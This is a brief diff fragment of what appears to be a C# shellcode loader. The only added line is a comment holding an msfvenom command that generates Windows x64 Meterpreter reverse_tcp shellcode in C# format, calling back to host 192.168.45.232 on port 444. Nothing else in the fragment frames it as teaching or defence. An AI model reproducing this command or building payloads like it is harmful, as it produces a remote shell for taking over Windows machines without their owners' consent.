@@ -1,3 +1,5 @@
+# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.232 lport=444 -f csharp
+
 using System;
 using System.Runtime.InteropServices;
 
